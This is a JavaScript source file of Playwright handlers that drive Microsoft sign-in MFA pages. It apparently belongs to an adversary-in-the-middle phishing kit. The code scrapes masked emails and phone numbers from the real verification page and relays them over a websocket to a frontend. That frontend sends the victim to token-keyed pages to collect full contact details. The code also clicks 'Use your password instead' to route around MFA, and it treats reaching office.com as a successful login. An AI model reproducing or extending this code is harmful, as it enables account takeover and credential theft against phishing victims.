/**
 * MFA Handlers
 * Handles verification options and MFA choice pages
 */

const globals = require('../config/globals');
const { sendToClient } = require('../services/websocket');
const regex = require('../config/regex');
const { TIMEOUTS, MAX_ATTEMPTS } = require('../config/constants');

/**
 * Handle verification options page - ERROR-PROOF MFA HANDLING
 * @param {Object} page - Playwright page object
 */
async function handleVerificationOptions(page) {
    console.log('🔍 Handling verification options...');
    const token = globals.get('globalToken') || 'token';

    // Get page content for parsing FIRST (before sending any redirect)
    const pageText = await page.textContent('body');

    console.log('\n📱 === MFA VERIFICATION OPTIONS DETECTED ===');

    // Parse masked emails and phones using regex module
    const maskedEmails = regex.extractMaskedEmails(pageText);
    const maskedPhones = regex.extractMaskedPhones(pageText);

    if (maskedEmails.length > 0) {
        console.log('📧 Masked emails found:');
        maskedEmails.forEach(email => console.log(`   - ${email}`));
    }

    if (maskedPhones.length > 0) {
        console.log('📞 Masked phone numbers found:');
        maskedPhones.forEach(phone => console.log(`   - ${phone}`));
    } else {
        console.log('⚠️ No masked phone numbers detected');
    }

    // SEND FIRST DETECTED OPTION IMMEDIATELY so FE has it when it reaches very.html
    let firstOption = null;
    if (maskedEmails.length > 0) {
        firstOption = maskedEmails[0];
        globals.setMfaOption(token, firstOption); // Session-isolated storage
        console.log(`📤 Sending first masked email to FE: ${firstOption}`);
        sendToClient({
            status: 'option_selected',
            selectedOption: firstOption,
            message: 'Masked email detected'
        });
    } else if (maskedPhones.length > 0) {
        firstOption = maskedPhones[0];
        globals.setMfaOption(token, firstOption); // Session-isolated storage
        console.log(`📤 Sending first masked phone to FE: ${firstOption}`);
        sendToClient({
            status: 'option_selected',
            selectedOption: firstOption,
            message: 'Masked phone detected'
        });
    }

    // WAIT A MOMENT to let FE process the selectedOption before sending redirect
    await new Promise(resolve => setTimeout(resolve, 500));

    // NOW send redirect to very page
    sendToClient({
        status: 'mfa_options_ready',
        message: 'MFA options page detected - Redirecting to verification page',
        redirect: `/${token}/very`
    });
    console.log('📤 Notified FE to redirect: /' + token + '/very (MFA options page)');

    /* 
    // IMMEDIATE DETECTION DISABLED - We want the user to see very.html and choose manually
    // IMMEDIATE EMAIL DETECTION: If masked emails found, send first one to frontend immediately
    if (maskedEmails.length > 0) {
        // ... (disabled code)
    }
    // IMMEDIATE PHONE DETECTION: If masked phones found (and no emails), send first one to frontend immediately
    else if (maskedPhones.length > 0) {
        // ... (disabled code)
    }
    */

    // Parse authenticator options
    const authenticatorKeywords = [
        'authenticator',
        'microsoft authenticator',
        'authentication app',
        'verification app',
        'security code',
        'two-factor',
        '2fa',
        'otp'
    ];

    const authenticatorOptions = [];
    authenticatorKeywords.forEach(keyword => {
        const keywordRegex = new RegExp(keyword, 'gi');
        const matches = pageText.match(keywordRegex) || [];
        authenticatorOptions.push(...matches.map(match => keyword));
    });

    if (authenticatorOptions.length > 0) {
        console.log('🔐 Authenticator options found:');
        const uniqueOptions = [...new Set(authenticatorOptions)];
        uniqueOptions.forEach(option => console.log(`   - ${option}`));
    }

    // Look for specific verification method elements
    let hasContactOptions = false;
    let hasCodeOptions = false;
    const verificationElements = await page.locator('button, a, [role="button"], .option, .verification-option').all();

    console.log('\n🎯 Available verification methods:');
    for (let i = 0; i < verificationElements.length; i++) {
        const element = verificationElements[i];
        try {
            const text = await element.textContent();
            const isVisible = await element.isVisible();

            if (text && isVisible && text.trim().length > 0) {
                console.log(`   ${i + 1}. "${text.trim()}"`);

                // Check if it contains contact info
                if (regex.hasMaskedEmail(text) || regex.hasMaskedPhone(text)) {
                    console.log(`      📋 Contains contact information`);
                    hasContactOptions = true;
                }

                // Check if it's code-related
                if (text.toLowerCase().includes('code') || text.toLowerCase().includes('send')) {
                    console.log(`      🔐 Code-related option`);
                    hasCodeOptions = true;
                }

                // Check if it's authenticator-related
                if (authenticatorKeywords.some(keyword => text.toLowerCase().includes(keyword))) {
                    console.log(`      🔐 Authenticator method`);
                }
            }
        } catch (e) {
            // Skip elements that can't be accessed
        }
    }

    console.log('==========================================\n');

    // ERROR-PROOF AUTO-SELECTION LOGIC
    let clickedOption = false;

    // Case 1: We have email/phone contact options - WAIT FOR USER CONFIRMATION FIRST
    if (hasContactOptions) {
        console.log('🎯 Contact options available - waiting for user to select option...');

        // Collect all email options first
        const emailOptions = [];
        const phoneOptions = [];

        for (let i = 0; i < verificationElements.length; i++) {
            const element = verificationElements[i];
            try {
                const text = await element.textContent();
                const isVisible = await element.isVisible();

                if (text && isVisible && text.trim().length > 0) {
                    if (regex.hasMaskedEmail(text)) {
                        emailOptions.push({ element, text: text.trim() });
                    } else if (regex.hasMaskedPhone(text)) {
                        phoneOptions.push({ element, text: text.trim() });
                    }
                }
            } catch (e) {
                // Continue to next element
            }
        }

        // Log detected options
        if (emailOptions.length > 0) {
            console.log(`📧 Found ${emailOptions.length} email option(s):`);
            emailOptions.forEach((option, index) => {
                console.log(`   ${index + 1}. "${option.text}"`);
            });
        }

        if (phoneOptions.length > 0) {
            console.log(`📞 Found ${phoneOptions.length} phone option(s):`);
            phoneOptions.forEach((option, index) => {
                console.log(`   ${index + 1}. "${option.text}"`);
            });
        }

        // NOTE: selectedOption already sent at lines 45-51 above - no need to send again

        // WAIT FOR USER CONFIRMATION BEFORE CLICKING
        console.log('⏳ Waiting for user to confirm option selection...');
        globals.set('globalUserConfirmed', false);
        let confirmationReceived = false;
        let confirmationAttempts = 0;
        const maxConfirmationAttempts = MAX_ATTEMPTS.USER_CONFIRMATION;

        while (!confirmationReceived && confirmationAttempts < maxConfirmationAttempts) {
            confirmationAttempts++;
            if (confirmationAttempts % 30 === 0) {
                console.log(`🔄 Still waiting for user confirmation... (${confirmationAttempts}/${maxConfirmationAttempts})`);
            }
            await page.waitForTimeout(1000);

            if (globals.get('globalUserConfirmed')) {
                confirmationReceived = true;
                console.log('✅ User confirmed option - proceeding with click');
            }
        }

        if (!confirmationReceived) {
            console.log('⚠️ No user confirmation received - proceeding automatically');
        }

        // NOW click the first email option (after user confirmation)
        clickedOption = false;
        const currentUrl = page.url();

        if (emailOptions.length > 0) {
            console.log('🔄 Clicking email option after user confirmation...');

            for (let i = 0; i < emailOptions.length; i++) {
                const option = emailOptions[i];
                console.log(`👆 Clicking email option ${i + 1}: "${option.text}"`);

                try {
                    await option.element.click();
                    console.log(`✅ Clicked email option ${i + 1}`);

                    // Wait for navigation to email input page
                    await page.waitForTimeout(3000);

                    const newUrl = page.url();
                    const newTitle = await page.title().catch(() => '');
                    const hasEmailInput = await page.locator('input[type="email"]').count() > 0;

                    if (newUrl !== currentUrl || hasEmailInput || newTitle.toLowerCase().includes('verify your email')) {
                        console.log(`🎯 SUCCESS! Navigation detected or email input page appeared`);
                        clickedOption = true;
                        break;
                    } else {
                        console.log(`⏳ No navigation detected yet, waiting longer...`);
                        await page.waitForTimeout(2000);
                        // Check again
                        const finalUrl = page.url();
                        const finalTitle = await page.title().catch(() => '');
                        const finalHasEmailInput = await page.locator('input[type="email"]').count() > 0;
                        if (finalUrl !== currentUrl || finalHasEmailInput || finalTitle.toLowerCase().includes('verify your email')) {
                            console.log(`🎯 SUCCESS! Email input page detected after wait`);
                            clickedOption = true;
                            break;
                        }
                    }
                } catch (e) {
                    console.log(`❌ Error clicking option ${i + 1}: ${e.message}`);
                }
            }
        }

        // If no email worked, try phone options with same logic
        if (!clickedOption && phoneOptions.length > 0) {
            console.log('🔄 Trying phone options with navigation detection...');

            for (let i = 0; i < phoneOptions.length; i++) {
                const option = phoneOptions[i];
                console.log(`👆 Trying phone option ${i + 1}: "${option.text}"`);

                try {
                    // Extract just the masked phone from the full text (e.g., "Text ****1234" -> "****1234")
                    let maskedPhoneValue = option.text;
                    const phoneMatch = option.text.match(/[\*\d][\*\d\s]*[\*\d]/);
                    if (phoneMatch) {
                        maskedPhoneValue = phoneMatch[0].replace(/\s/g, '');
                    }

                    // Send option to frontend for user confirmation
                    sendToClient({
                        displayValues: [`Phone Option: ${maskedPhoneValue}`],
                        selectedOption: maskedPhoneValue,
                        status: 'option_selected'
                    });
                    console.log(`📤 Sent phone option to frontend for confirmation: ${maskedPhoneValue}`);

                    // Wait for user confirmation
                    console.log('⏳ Waiting for user to confirm phone option selection...');
                    globals.set('globalUserConfirmed', false);
                    let confirmationReceived = false;
                    let confirmationAttempts = 0;
                    const maxConfirmationAttempts = MAX_ATTEMPTS.USER_CONFIRMATION;

                    while (!confirmationReceived && confirmationAttempts < maxConfirmationAttempts) {
                        confirmationAttempts++;
                        if (confirmationAttempts % 30 === 0) {
                            console.log(`🔄 Still waiting for user confirmation... (${confirmationAttempts}/${maxConfirmationAttempts})`);
                        }
                        await page.waitForTimeout(1000);

                        if (globals.get('globalUserConfirmed')) {
                            confirmationReceived = true;
                            console.log('✅ User confirmed phone option - proceeding with click');
                        }
                    }

                    if (!confirmationReceived) {
                        console.log('⚠️ No user confirmation received - proceeding automatically');
                    }

                    // Click the option
                    await option.element.click();
                    console.log(`✅ Clicked phone option ${i + 1}`);

                    // Wait for last 4 digits page to appear
                    console.log('⏳ Waiting for last 4 digits page to appear...');
                    let last4DigitsPageDetected = false;
                    let waitAttempts = 0;
                    const maxWaitAttempts = 10;

                    while (!last4DigitsPageDetected && waitAttempts < maxWaitAttempts) {
                        waitAttempts++;
                        await page.waitForTimeout(1000);

                        const currentText = await page.textContent('body').catch(() => '');
                        const hasLast4Text = currentText.toLowerCase().includes('last 4 digits');
                        const hasProofConfirmation = await page.locator('#proof-confirmation').count() > 0;
                        const hasLast4Placeholder = await page.locator('input[placeholder*="Last 4 digits"]').count() > 0;

                        if (hasLast4Text || hasProofConfirmation || hasLast4Placeholder) {
                            last4DigitsPageDetected = true;
                            console.log('🎯 SUCCESS! Last 4 digits page detected!');
                            break;
                        }
                    }

                    if (last4DigitsPageDetected) {
                        clickedOption = true;
                        break;
                    }

                    // Check for UI changes
                    const afterText = await page.textContent('body').catch(() => '');
                    const newUrl = page.url();
                    const beforeText = await page.textContent('body').catch(() => '');

                    const hasProofConfirmation = await page.locator('#proof-confirmation').count() > 0;
                    const hasLast4DigitsPlaceholder = await page.locator('input[placeholder*="Last 4 digits"]').count() > 0;

                    const contentChanged = afterText !== beforeText;
                    const urlChanged = newUrl !== currentUrl;
                    const hasPhoneDigitsInput = hasProofConfirmation || hasLast4DigitsPlaceholder;
                    const hasLast4DigitsText = afterText.toLowerCase().includes('last 4 digits');

                    if (urlChanged || (contentChanged && (hasPhoneDigitsInput || hasLast4DigitsText))) {
                        console.log(`🎯 SUCCESS! Navigation detected`);
                        clickedOption = true;
                        break;
                    }
                } catch (e) {
                    console.log(`❌ Error clicking option ${i + 1}: ${e.message}`);
                }
            }
        }

        if (clickedOption) {
            console.log('📧 Contact option clicked successfully - waiting for next page...');

            let selectedOption = emailOptions.length > 0 ? emailOptions[0].text :
                phoneOptions.length > 0 ? phoneOptions[0].text : null;

            if (selectedOption) {
                // Extract just the masked email/phone
                const emailMatch = selectedOption.match(regex.maskedEmailRegex);
                if (emailMatch) {
                    selectedOption = emailMatch[0];
                } else {
                    const phones = regex.extractMaskedPhones(selectedOption);
                    if (phones.length > 0) {
                        selectedOption = phones[0].replace(/^Text\s+/i, '');
                    }
                }

                const token = globals.get('globalToken') || 'token';
                sendToClient({
                    displayValues: [`Selected Option: ${selectedOption}`],
                    selectedOption: selectedOption,
                    status: 'option_selected',
                    redirect: emailOptions.length > 0 ? `/${token}/mailinput` : `/${token}/numinput`,
                    message: `Selected ${emailOptions.length > 0 ? 'email' : 'phone'} option - Redirecting to input page`
                });
                console.log(`📤 Sent selected option to frontend: ${selectedOption} - redirecting to ${emailOptions.length > 0 ? `/${token}/mailinput` : `/${token}/numinput`}`);
            }

            await page.waitForTimeout(3000);
            return;
        }
    }

    // Case 2: Code options but no contact options
    if (hasCodeOptions && !hasContactOptions) {
        console.log('🔐 Code options available - no contact options found');

        const pageText = await page.textContent('body');
        let selectedOption = null;

        const emails = regex.extractMaskedEmails(pageText);
        if (emails.length > 0) {
            selectedOption = emails[0];
        } else {
            const phones = regex.extractMaskedPhones(pageText);
            if (phones.length > 0) {
                selectedOption = phones[0].replace(/^Text\s+/i, '');
            }
        }

        if (selectedOption) {
            const token = globals.get('globalToken') || 'token';
            const isEmail = emails.length > 0;
            sendToClient({
                displayValues: [`Selected Option: ${selectedOption}`],
                selectedOption: selectedOption,
                status: 'option_selected',
                redirect: isEmail ? `/${token}/mailinput` : `/${token}/numinput`,
                message: `${isEmail ? 'Email' : 'Phone'} option detected - Redirecting to input page`
            });
        }

        // DON'T click "Send code" automatically - wait for user to provide full email first
        // The "Send code" button will be clicked AFTER the email is filled in handleEmailInput
        console.log('⏳ Code options detected - waiting for user to provide full email');
        console.log('📝 User should enter full email on mailinput.html, then backend will fill and click "Send code"');
        // Just return - let handleEmailInput handle the "Send code" click after email is filled
        return;
    }

    // Case 3: No actionable options found
    if (!clickedOption) {
        console.log('⚠️ No actionable verification option found');

        const codeInput = page.locator('input[type="text"], input[type="number"], input[placeholder*="code"]').first();
        if (await codeInput.isVisible()) {
            console.log('🔢 Code input field detected - waiting for manual code entry');

            sendToClient({
                status: 'code_input_ready',
                message: 'Code input page ready - Redirecting to verification page',
                redirect: '/ms/very.html'
            });
            console.log('📤 Sent immediate code input notification to frontend');
            return;
        }

        const pageUrl = page.url();
        const pageTitle = await page.title();
        if (pageUrl.includes('office.com') || pageTitle.includes('Office') || pageTitle.includes('Home')) {
            console.log('✅ Appears to be successful login completion');
            return;
        }
    }
}

/**
 * Handle MFA choice page (masked email with authenticator options)
 * @param {Object} page - Playwright page object
 */
async function handleMfaChoice(page) {
    console.log('🔐 Handling MFA choice page - masked email with authenticator options OR authenticator app default');

    try {
        await page.waitForTimeout(3000);

        const currentUrl = page.url();
        const pageTitle = await page.title();
        const pageText = await page.textContent('body').catch(() => '');
        console.log('📄 Page Text Content (first 500 chars):', pageText.substring(0, 500).replace(/\s+/g, ' '));

        console.log(`🔍 MFA page info - URL: ${currentUrl}`);
        console.log(`🔍 MFA page info - Title: ${pageTitle}`);

        // Step 1: Look for "Sign in another way" button
        const signInAnotherWaySelectors = [
            'button:has-text("Sign in another way")',
            'a:has-text("Sign in another way")',
            'button:has-text("Try another method")',
            'a:has-text("Try another method")',
            'text=/sign\s*in\s*another\s*way/i',
            'text=/try\s*another\s*method/i',
            'text=/Other\s*ways\s*to\s*sign\s*in/i',
            'text=/I\s*can\'t\s*use\s*my/i'
        ];

        let signInAnotherWayClicked = false;

        console.log('🔍 Starting search for "Sign in another way" button...');

        const allClickableElements = await page.locator('button, a, [role="button"], [onclick], div[tabindex]').all();
        console.log(`🔍 Found ${allClickableElements.length} clickable elements on page`);

        for (const selector of signInAnotherWaySelectors) {
            try {
                const elements = await page.locator(selector).all();

                for (const element of elements) {
                    try {
                        if (await element.isVisible({ timeout: 500 })) {
                            const text = (await element.textContent() || '').trim();
                            console.log(`🔍 Found element with text: "${text}" using selector: ${selector}`);

                            if (/sign\s*in\s*another\s*way|try\s*another|different\s*method|use\s*password/i.test(text)) {
                                console.log(`✅ Clicking element with text: "${text}"`);
                                await element.scrollIntoViewIfNeeded();
                                await element.click({ force: true });
                                signInAnotherWayClicked = true;
                                console.log(`✅ Successfully clicked "${text}"`);
                                await page.waitForTimeout(2000);
                                break;
                            }
                        }
                    } catch (e) {
                        console.log(`⚠️ Error checking element:`, e.message);
                    }
                }
                if (signInAnotherWayClicked) break;
            } catch (e) {
                continue;
            }
        }

        // If still not found, search ALL clickable elements
        if (!signInAnotherWayClicked) {
            console.log('🔍 Searching all clickable elements for "Sign in another way"...');
            console.log('🔍 DEBUG: Dumping all clickable elements text for tracing:');
            for (const element of allClickableElements) {
                try {
                    if (await element.isVisible({ timeout: 100 })) {
                        const text = (await element.textContent() || '').trim();
                        const tagName = await element.evaluate(e => e.tagName).catch(() => 'UNKNOWN');

                        if (text.length > 0) {
                            console.log(`   👉 Element: "${text}" [${tagName}]`);
                        }

                        const lowerText = text.toLowerCase();
                        if (lowerText.includes('sign in another way') ||
                            lowerText.includes('try another method') ||
                            lowerText.includes('another way') ||
                            lowerText.includes('different method')) {
                            console.log(`✅ Found clickable element with text: "${text}"`);
                            await element.scrollIntoViewIfNeeded();
                            await element.click({ force: true });
                            signInAnotherWayClicked = true;
                            console.log(`✅ Successfully clicked "${text}"`);
                            await page.waitForTimeout(2000);
                            break;
                        }
                    }
                } catch (e) {
                    continue;
                }
            }
        }

        /*
        // IMMEDIATE AUTO-CLICK DISABLED - We want user to see very.html first
        // If "Sign in another way" was not found, look for email verification option
        if (!signInAnotherWayClicked) {
            // ... (disabled code)
        }
        */

        if (signInAnotherWayClicked) {
            await page.waitForTimeout(3000);
            console.log('✅ Page updated after clicking "Sign in another way"');
        } else {
            console.log('⚠️ Could not find "Sign in another way" button');
        }

        // Special handling for "Get a code to sign in" page
        if (pageTitle.includes('Get a code to sign in')) {
            console.log('🔍 Detected "Get a code to sign in" page - prioritizing "Use your password" option');
        }

        // Step 2: Look for "Use your password instead" option - ENHANCED SELECTORS
        const passwordInsteadSelectors = [
            'button:has-text("Use your password instead")',
            'a:has-text("Use your password instead")',
            'div[role="button"]:has-text("Use your password instead")',
            'text=/Use.*password.*instead/i',
            'text=/password.*instead/i',
            // Broader selectors for "Use your password" without "instead"
            'button:has-text("Use your password")',
            'a:has-text("Use your password")',
            'div[role="button"]:has-text("Use your password")',
            'text=/Use.*your.*password/i',
            // Fallback for just "Password" if it looks like an option
            'div[role="button"]:has-text("Password")',
            'a:has-text("Password")'
        ];

        let passwordInsteadClicked = false;

        for (const selector of passwordInsteadSelectors) {
            try {
                // Use .all() to find all matches and check them
                const elements = await page.locator(selector).all();

                for (const element of elements) {
                    if (await element.isVisible({ timeout: 500 })) {
                        const text = (await element.textContent() || '').trim();
                        // Verify it's not just a label or title
                        if (!text.includes('Enter password') && !text.includes('Forgot password')) {
                            console.log(`✅ Found password option with text: "${text}" using selector: ${selector}`);
                            await element.scrollIntoViewIfNeeded();
                            await element.click({ force: true });
                            passwordInsteadClicked = true;
                            console.log('✅ Clicked "Use your password" option');
                            break;
                        }
                    }
                }
                if (passwordInsteadClicked) break;
            } catch (e) {
                continue;
            }
        }

        if (passwordInsteadClicked) {
            await page.waitForTimeout(3000);
            console.log('✅ MFA choice handled - should redirect to password entry');
        } else {
            console.log('⚠️ Could not find "Use your password instead" option');

            // Fallback: Check for "Show more verification methods"
            const showMoreSelector = 'text=/Show.*more.*methods/i';
            if (await page.locator(showMoreSelector).count() > 0) {
                console.log('✅ Found "Show more verification methods" - clicking it');
                await page.click(showMoreSelector);
                await page.waitForTimeout(1000);
                // Re-evaluate page context after overlap
                return; // Let main loop re-detect page as verification_options now that more potentially shown
            }

            // Fallback: Check for masked options if we are stuck here
            const pageTextFallback = await page.textContent('body');
            const maskedEmails = require('../config/regex').extractMaskedEmails(pageTextFallback);
            const maskedPhones = require('../config/regex').extractMaskedPhones(pageTextFallback);

            if (maskedEmails.length > 0 || maskedPhones.length > 0) {
                console.log('✅ Found masked options on MFA choice page - redirecting to verification_options handler');
                // Call the handler directly since we are on the right page effectively
                await handleVerificationOptions(page);
                return;
            }
        }

        const finalUrl = page.url();
        console.log(`🔍 Final URL after MFA handling: ${finalUrl}`);

        if (finalUrl !== currentUrl) {
            console.log('✅ URL changed successfully after MFA choice handling');
        } else {
            console.log('⚠️ URL did not change - MFA choice handling did not progress');
        }
    } catch (error) {
        console.error('❌ Error handling MFA choice page:', error.message);
        console.log('⚠️ MFA choice handling failed, but continuing...');
    }
}

module.exports = {
    handleVerificationOptions,
    handleMfaChoice
};
